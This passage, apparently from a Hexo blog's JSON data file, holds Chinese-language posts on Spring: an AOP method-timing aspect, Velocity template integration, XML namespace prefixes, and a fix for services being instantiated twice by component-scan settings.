expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n禁用默认的包扫描过滤策略，只扫描Controller注解。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 五、创建TimeCost注解\n通过注解来开关是否需要进行方法耗时统计。\n\n``` java\npackage com.martinye.demo.support.annotation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * @description\n * \n * @author yeshaoting\n * @date 2015-05-07 13:45:29\n */\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface TimeCost {\n\n\n}\n\n```\n\n\n## 六、创建TimeCost切面\n\n切面检测加有TimeCost的方法。\n\n为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。\n此优先级通过在切面类上添加`@Order`注解来完成。\n\n``` java\npackage com.martinye.demo.support.aspect;\n\nimport org.apache.commons.lang3.time.StopWatch;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.Signature;\nimport org.aspectj.lang.annotation.After;\nimport org.aspectj.lang.annotation.AfterReturning;\nimport org.aspectj.lang.annotation.AfterThrowing;\nimport org.aspectj.lang.annotation.Around;\nimport org.aspectj.lang.annotation.Aspect;\nimport org.aspectj.lang.annotation.Before;\nimport org.aspectj.lang.annotation.Pointcut;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.core.annotation.Order;\n\n/**\n * @description 方法耗时切面\n * \n * @author yeshaoting\n * @date 2015-06-11 11:18:06\n */\n@Aspect\n@Order(8)\npublic class TimeCostAspect {\n  \n  private Logger logger = LoggerFactory.getLogger(this.getClass());\n  \n  @Pointcut(\"@annotation(com.martinye.demo.support.annotation.TimeCost)\")\n  public void point() {};\n  \n  @Before(value = \"point()\")\n  public void beforeAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= before advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @After(value = \"point()\")\n  public void afterAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint) throws Throwable {\n    logger.info(\"======= before around advice {} ======\", joinPoint.getSignature().getName());\n    \n    StopWatch clock = new StopWatch();\n    clock.start(); // 计时开始\n    \n    try {\n      joinPoint.proceed();\n    } catch (Exception e) {\n      throw e;\n    } finally {\n      clock.stop(); // 计时结束\n      long timeCost = clock.getTime();\n      Signature sig = joinPoint.getSignature();\n      logger.info(\"execute method {}.{} take time: {}(ms)\", sig.getDeclaringTypeName(),\n          sig.getName(), timeCost);\n      \n      logger.info(\"======= after around advice {} ======\", joinPoint.getSignature().getName());\n    }\n    \n  }\n  \n  @AfterThrowing(value = \"point()\", throwing = \"e\")\n  public void afterThrowingAdvice(JoinPoint joinPoint, Throwable e) {\n    logger.info(\"======= after throwing advice {} ======\", joinPoint.getSignature().getName());\n    logger.info(\" > error info：\" + e.getMessage());\n  }\n  \n  @AfterReturning(value = \"point()\")\n  public void afteReturningAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after returning advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n}\n```\n","source":"_posts/article/spring/spring特性实践 - AOP.md","raw":"categories:\n  - 后端开发\ntags:\n  - aop\n  - java\n  - spring\n  - 实践\ntitle: spring特性实践 - AOP\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何使用spring aop，并通过一个函数耗时统计切面demo来讲述使用具体步骤。\n\n\n## 一、创建maven工程\n\n通过STS创建一个maven工程martinye-demo-spring-support。\n\n修改pom.xml文件，添加项目相关依赖如下：\n\n**servlet**\n- javax.servlet-api\n- jstl\n- standard\n- jsp-api\n\n**spring**\n- spring-webmvc\n- aspectjweaver\n\n**log**\n- slf4j-api\n- slf4j-log4j12\n\n**utils**\n- commons-lang3\n- commons-collections\n- commons-io\n- guava\n- fastjson\n\n**test**\n- junit\n- spring-test\n\n\n<!-- more -->\n\n## 二、配置servlet容器\n配置路径：/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/web.xml\n\nweb servlet容器web.xml，添加加载spring容器的配置。\n根据关注点不同，我们把spring容器配置定义分开，如下所示：\n\n### 定义spring root容器\n实例化类对象。\n\n配置如下：\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n```\n\n### 定义spring mvc容器\n处理用户请求。\nspring mvc容器对应的ApplicationContext是spring root容器对应的ApplicationContext的子类对象，可持有spring root容器中注入的类对象。\n\n配置如下：\n``` xml\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n## 三、配置spring-beans.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"true\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 四、配置spring-mvc.xml\n配置如下：\n``` xml\n  <context:property-placeholder ignore-resource-not-found=\"true\" location=\"classpath*:app.properties\" />\n\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters=\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.aspectj.lang.annotation.Aspect\"/>\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n\n  <!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory -->\n  <bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n    <property name=\"prefix\" value=\"/WEB-INF/views/\" />\n    <property name=\"suffix\" value=\".jsp\" />\n  </bean>\n\n  <aop:aspectj-autoproxy expose-proxy=\"true\" proxy-target-class=\"false\"/>\n```\n\n**配置描述**：\n\n1. 加载配置资源：app.properties。\n\n2. 启用注解功能\n禁用默认的包扫描过滤策略，只扫描Controller注解。\n\n3. 开启aop，启用@AspectJ注解。\n在注入当前容器的类对象方法上，支持AOP注解。\n\n\n## 五、创建TimeCost注解\n通过注解来开关是否需要进行方法耗时统计。\n\n``` java\npackage com.martinye.demo.support.annotation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * @description\n * \n * @author yeshaoting\n * @date 2015-05-07 13:45:29\n */\n@Target({ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface TimeCost {\n\n\n}\n\n```\n\n\n## 六、创建TimeCost切面\n\n切面检测加有TimeCost的方法。\n\n为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。\n此优先级通过在切面类上添加`@Order`注解来完成。\n\n``` java\npackage com.martinye.demo.support.aspect;\n\nimport org.apache.commons.lang3.time.StopWatch;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.Signature;\nimport org.aspectj.lang.annotation.After;\nimport org.aspectj.lang.annotation.AfterReturning;\nimport org.aspectj.lang.annotation.AfterThrowing;\nimport org.aspectj.lang.annotation.Around;\nimport org.aspectj.lang.annotation.Aspect;\nimport org.aspectj.lang.annotation.Before;\nimport org.aspectj.lang.annotation.Pointcut;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.core.annotation.Order;\n\n/**\n * @description 方法耗时切面\n * \n * @author yeshaoting\n * @date 2015-06-11 11:18:06\n */\n@Aspect\n@Order(8)\npublic class TimeCostAspect {\n  \n  private Logger logger = LoggerFactory.getLogger(this.getClass());\n  \n  @Pointcut(\"@annotation(com.martinye.demo.support.annotation.TimeCost)\")\n  public void point() {};\n  \n  @Before(value = \"point()\")\n  public void beforeAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= before advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @After(value = \"point()\")\n  public void afterAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n  @Around(value = \"point()\")\n  public void aroundAdvice(ProceedingJoinPoint joinPoint) throws Throwable {\n    logger.info(\"======= before around advice {} ======\", joinPoint.getSignature().getName());\n    \n    StopWatch clock = new StopWatch();\n    clock.start(); // 计时开始\n    \n    try {\n      joinPoint.proceed();\n    } catch (Exception e) {\n      throw e;\n    } finally {\n      clock.stop(); // 计时结束\n      long timeCost = clock.getTime();\n      Signature sig = joinPoint.getSignature();\n      logger.info(\"execute method {}.{} take time: {}(ms)\", sig.getDeclaringTypeName(),\n          sig.getName(), timeCost);\n      \n      logger.info(\"======= after around advice {} ======\", joinPoint.getSignature().getName());\n    }\n    \n  }\n  \n  @AfterThrowing(value = \"point()\", throwing = \"e\")\n  public void afterThrowingAdvice(JoinPoint joinPoint, Throwable e) {\n    logger.info(\"======= after throwing advice {} ======\", joinPoint.getSignature().getName());\n    logger.info(\" > error info：\" + e.getMessage());\n  }\n  \n  @AfterReturning(value = \"point()\")\n  public void afteReturningAdvice(JoinPoint joinPoint) {\n    logger.info(\"======= after returning advice {} ======\", joinPoint.getSignature().getName());\n  }\n  \n}\n```\n","slug":"article/spring/spring特性实践 - AOP","published":1,"updated":"2016-03-31T15:24:37.000Z","_id":"cilpxkg9h000vavbt24pbx5w4","comments":1,"layout":"post","photos":[],"link":""},{"title":"spring整合实践 - velocity","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何整合spring与velocity。\n此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。\n\n\n## 一、配置spring mvc\n首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.\n\n\n## velocity engine实例化\n对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。\n\n具体配置片段如下：\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\" />\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\" />\n  </bean>\n```\n\n其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。\n**注**：vm模板也可以放置到src/main/resources目录下。\n\n\n<!-- more -->\n\n## 二、velocity配置\nvelocity.properties配置会覆盖默认配置。\n默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。\n\n更详细参数配置可参考：configuring_resource_loaders\n\n根据需要我们自定义的配置文件内容，如下所示：\n``` properties\n\n# encoding\ninput.encoding=UTF-8\noutput.encoding=UTF-8\ncontentType=text/html;charset=UTF-8\n\n\n# autoreload when vm changed\nfile.resource.loader.cache=false\nfile.resource.loader.modificationCheckInterval=1\nvelocimacro.library.autoreload=true\n\n\n# macro config\n# 默认情况，velocimacro.library相对于resourceLoaderPath目录\nvelocimacro.library=macro.vm\n#velocimacro.permissions.allow.inline=true\n#velocimacro.permissions.allow.inline.to.replace.global=false\n#velocimacro.permissions.allow.inline.local.scope=false\n\n#layout\n#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/\n#tools.view.servlet.error.template=/WEB-INF/vm/error.vm\n#tools.view.servlet.layout.default.template=default.vm\n\n\n# runtime log\nruntime.log=velocity.log\nruntime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem\nruntime.log.error.stacktrace=true\nruntime.log.warn.stacktrace=true\nruntime.log.info.stacktrace=false\nruntime.log.invalid.reference=true\n\n```\n\n\n## 三、简单模板\n``` xml\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n  <title>$!title</title>\n</head>\n<body>\n  <h1>标题：$!title</h1>\n  <div>\n    <p>内容：$!content</p>\n    <p>macro函数测试：#test()</p>\n  </div>\n</body>\n</html>\n```\n\n\n## 四、模板渲染\n使用VelocityEngineUtils能很方便的merge template。\n需要准备一个Map，用于传递变量到VLT中。\n\n**代码样例**：\n``` java\n    Map<String, Object> model = Maps.newHashMap();\n    model.put(\"title\", \"Velocity Template\");\n    model.put(\"content\", \"Content in Velocity Template\");\n    \n    String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, \"test.vm\", Constants.ENCODING, model);\n```\n\n## 五、参考文档\n1. [VelocityAndSpringStepByStep](http://wiki.apache.org/velocity/VelocityAndSpringStepByStep)\n2. [velocity.properties配置说明](http://mj4d.iteye.com/blog/1524050)\n3. [springmvc 3.1整合velocity](http://blog.csdn.net/glarystar/article/details/6636574)\n4. [configuring_resource_loaders](http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders)\n\n","source":"_posts/article/spring/spring整合实践 - velocity.md","raw":"categories:\n  - 后端开发\ntags:\n  - spring\n  - java\n  - 实践\n  - velocity\ntitle: spring整合实践 - velocity\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何整合spring与velocity。\n此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。\n\n\n## 一、配置spring mvc\n首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.\n\n\n## velocity engine实例化\n对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。\n\n具体配置片段如下：\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\" />\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\" />\n  </bean>\n```\n\n其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。\n**注**：vm模板也可以放置到src/main/resources目录下。\n\n\n<!-- more -->\n\n## 二、velocity配置\nvelocity.properties配置会覆盖默认配置。\n默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。\n\n更详细参数配置可参考：configuring_resource_loaders\n\n根据需要我们自定义的配置文件内容，如下所示：\n``` properties\n\n# encoding\ninput.encoding=UTF-8\noutput.encoding=UTF-8\ncontentType=text/html;charset=UTF-8\n\n\n# autoreload when vm changed\nfile.resource.loader.cache=false\nfile.resource.loader.modificationCheckInterval=1\nvelocimacro.library.autoreload=true\n\n\n# macro config\n# 默认情况，velocimacro.library相对于resourceLoaderPath目录\nvelocimacro.library=macro.vm\n#velocimacro.permissions.allow.inline=true\n#velocimacro.permissions.allow.inline.to.replace.global=false\n#velocimacro.permissions.allow.inline.local.scope=false\n\n#layout\n#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/\n#tools.view.servlet.error.template=/WEB-INF/vm/error.vm\n#tools.view.servlet.layout.default.template=default.vm\n\n\n# runtime log\nruntime.log=velocity.log\nruntime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem\nruntime.log.error.stacktrace=true\nruntime.log.warn.stacktrace=true\nruntime.log.info.stacktrace=false\nruntime.log.invalid.reference=true\n\n```\n\n\n## 三、简单模板\n``` xml\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n  <title>$!title</title>\n</head>\n<body>\n  <h1>标题：$!title</h1>\n  <div>\n    <p>内容：$!content</p>\n    <p>macro函数测试：#test()</p>\n  </div>\n</body>\n</html>\n```\n\n\n## 四、模板渲染\n使用VelocityEngineUtils能很方便的merge template。\n需要准备一个Map，用于传递变量到VLT中。\n\n**代码样例**：\n``` java\n    Map<String, Object> model = Maps.newHashMap();\n    model.put(\"title\", \"Velocity Template\");\n    model.put(\"content\", \"Content in Velocity Template\");\n    \n    String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, \"test.vm\", Constants.ENCODING, model);\n```\n\n## 五、参考文档\n1. [VelocityAndSpringStepByStep](http://wiki.apache.org/velocity/VelocityAndSpringStepByStep)\n2. [velocity.properties配置说明](http://mj4d.iteye.com/blog/1524050)\n3. [springmvc 3.1整合velocity](http://blog.csdn.net/glarystar/article/details/6636574)\n4. [configuring_resource_loaders](http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders)\n\n","slug":"article/spring/spring整合实践 - velocity","published":1,"updated":"2016-03-31T15:24:41.000Z","_id":"cilpxkg9l0011avbt847x46qt","comments":1,"layout":"post","photos":[],"link":""},{"title":"spring容器标签前缀","date":"2016-02-28T05:53:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n一般地，spring容器标签bean元数据格式为`<bean></bean>`。但是，奇怪的是有的时候必须使用`<beans:bean></beans:bean>`，否则会报错。\n\n## 一、为什么会这样？\n这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。\n由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。\n\n例如：spring **tx** schema包含annotation-driven(`<tx:annotation-driven/>`)，同时，spring mvc schema也包含annotation-driven(`<mvc:annotation-driven/>`)\n\n## 二、小结\n对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n而对于需要使用beans前缀的，xmlns被修改了，可能是：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/mvc\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n**由此可知**：\n> 使用主命名空间里的标签，命名空间前缀并不是必须的。\n\n## 三、参考文档\nhttp://bbs.csdn.net/topics/340026084\nhttp://www.w3school.com.cn/tags/tag_prop_xmlns.asp","source":"_posts/article/spring/spring容器标签前缀.md","raw":"tags:\n  - spring\n  - issue\n  - java\ncategories:\n  - 后端开发\ntitle: spring容器标签前缀\ndate: 2016-02-28 13:53:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n一般地，spring容器标签bean元数据格式为`<bean></bean>`。但是，奇怪的是有的时候必须使用`<beans:bean></beans:bean>`，否则会报错。\n\n## 一、为什么会这样？\n这与spring容器xml配置当前主要的命名空间(xmlns)设置有关。\n由于在同一个xml配置文件中可能会加载多个文档结构定义(DTD)，因此需要使用命名空间来区分开多个DTD中可能相同的文档标签。\n\n例如：spring **tx** schema包含annotation-driven(`<tx:annotation-driven/>`)，同时，spring mvc schema也包含annotation-driven(`<mvc:annotation-driven/>`)\n\n## 二、小结\n对于以上问题描述情况，不需要使用beans前缀的，xmlns是如下情况：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n而对于需要使用beans前缀的，xmlns被修改了，可能是：\n``` xml\n<beans xmlns=\"http://www.springframework.org/schema/mvc\"\n\t   xmlns:beans=\"http://www.springframework.org/schema/beans\">\n</beans>\n```\n\n**由此可知**：\n> 使用主命名空间里的标签，命名空间前缀并不是必须的。\n\n## 三、参考文档\nhttp://bbs.csdn.net/topics/340026084\nhttp://www.w3school.com.cn/tags/tag_prop_xmlns.asp","slug":"article/spring/spring容器标签前缀","published":1,"updated":"2016-03-31T15:24:44.000Z","_id":"cilpxkg9o0016avbt3eubyi9k","comments":1,"layout":"post","photos":[],"link":""},{"title":"spring mvc service实例化二次问题","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n描述：错误地spring容器配置，导致spring实例service二次。\n\n\n## 项目现状\n\n### web.xml配置\nweb容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n<!-- more -->\n\n\n### root spring配置\n**期望**通过注解实例化除Controller之外的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n### mvc spring配置\n**期望**通过注解实例化只有Controller的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n\n## 问题小析\n通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。\n\n### 解析方案1\nspring-mvc.xml扫描时，base-package设置更细粒度的子包。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo.controller\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 解析方案2\n设置use-default-filters值为false，其值默认为true。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters＝\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 结语\n查阅了相关文档，发现：\n1. spring`<context:component-scan>`标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。\n2. context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。\n3. use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。\n\n\n\n## 参考文档\n- [context:component-scan扫描使用上的容易忽略的use-default-filters](http://jinnianshilongnian.iteye.com/blog/1762632)\n- [spring配置中<context:component-scan/>的use-default-filters的作用](http://liuluo129.iteye.com/blog/1943412)\n\n\n","source":"_posts/article/spring/spring mvc service实例化二次问题.md","raw":"categories:\n  - 后端开发\ntags:\n  - spring\n  - java\n  - mvc\n  - issue\ntitle: spring mvc service实例化二次问题\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n描述：错误地spring容器配置，导致spring实例service二次。\n\n\n## 项目现状\n\n### web.xml配置\nweb容器，首先加载spring-beans.xml配置，再加载spring-mvc.xml配置。\n``` xml\n  <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->\n  <context-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:spring-beans.xml</param-value>\n  </context-param>\n\n  <!-- Creates the Spring Container shared by all Servlets and Filters -->\n  <listener>\n    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n\n  <!-- Processes application requests -->\n  <servlet>\n    <servlet-name>spring</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n      <param-name>contextConfigLocation</param-name>\n      <param-value>classpath:spring-mvc.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>spring</servlet-name>\n    <url-pattern>/</url-pattern>\n  </servlet-mapping>\n```\n\n\n<!-- more -->\n\n\n### root spring配置\n**期望**通过注解实例化除Controller之外的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:exclude-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n### mvc spring配置\n**期望**通过注解实例化只有Controller的对象。\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n\n## 问题小析\n通过如此配置，发现spring在加载spring-beans.xml时，实例化了一次service，再加载spring-mvc.xml时，实例化了一次controller和一次service，导致spring先后总共实例化二次service的情况发生。\n\n### 解析方案1\nspring-mvc.xml扫描时，base-package设置更细粒度的子包。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo.controller\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo.controller包路径下子标签指明的类型，以及**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 解析方案2\n设置use-default-filters值为false，其值默认为true。如：\n``` xml\n  <!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 -->\n  <context:component-scan base-package=\"com.martinye.demo\" use-default-filters＝\"false\">\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\" />\n    <context:include-filter type=\"annotation\" expression=\"org.springframework.web.bind.annotation.ControllerAdvice\" />\n  </context:component-scan>\n```\n\n此配置的含义：只扫描com.martinye.demo包路径下子标签指明的类型，不自动注册**默认的**@Component、@ManagedBean、@Named注解类型。\n\n**注**：子标签与注解类型冲突，以子标签配置为准。\n\n\n### 结语\n查阅了相关文档，发现：\n1. 